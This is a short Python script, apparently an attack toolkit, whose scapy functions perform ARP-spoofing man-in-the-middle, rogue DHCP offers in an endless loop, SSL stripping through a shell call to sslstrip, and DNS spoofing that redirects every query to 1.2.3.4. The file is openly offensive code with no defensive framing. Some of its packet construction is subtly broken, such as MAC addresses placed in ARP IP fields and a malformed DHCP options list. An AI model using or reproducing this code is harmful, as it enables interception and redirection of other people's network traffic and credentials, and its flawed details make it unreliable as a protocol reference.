from scapy.all import *
import subprocess

def perform_mitm_attack(target_mac, gateway_mac, interface='eth0'):
    arp_response_target = ARP(pdst=target_mac, hwdst=gateway_mac, op=2)
    arp_response_gateway = ARP(pdst=gateway_mac, hwdst=target_mac, op=2)
    send(arp_response_target, iface=interface, count=5, verbose=0)
    send(arp_response_gateway, iface=interface, count=5, verbose=0)

def perform_dhcp_spoofing(interface='eth0'):
    def send_dhcp_offer():
        dhcp_offer = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=67, dport=68)/BOOTP(op=2, chaddr="00:11:22:33:44:55")/DHCP(options=[("message-type", "offer"), ("server_id", "192.168.0.1"), ("lease_time", 3600), ("end")])
        sendp(dhcp_offer, iface=interface, verbose=0)

    # Send DHCP offers periodically
    print("Starting DHCP spoofing...")
    while True:
        send_dhcp_offer()



def perform_ssl_stripping(interface='eth0'):
    # Run SSLStrip tool
    command = f"sslstrip -l 10000"
    try:
        subprocess.run(command, shell=True, check=True)
        print("SSL Stripping attack initiated.")
    except subprocess.CalledProcessError as e:
        print(f"Error occurred: {e}")


def perform_dns_spoofing(interface='eth0'):
    def spoof_dns(packet):
        if packet.haslayer(DNSQR):
            # Craft a fake DNS response
            dns_response = IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=53)/DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata="1.2.3.4"))
            send(dns_response, iface=interface, verbose=0)
    
    # Sniff and spoof DNS packets
    print("Starting DNS spoofing...")
    sniff(iface=interface, prn=spoof_dns, filter="udp port 53", store=0)

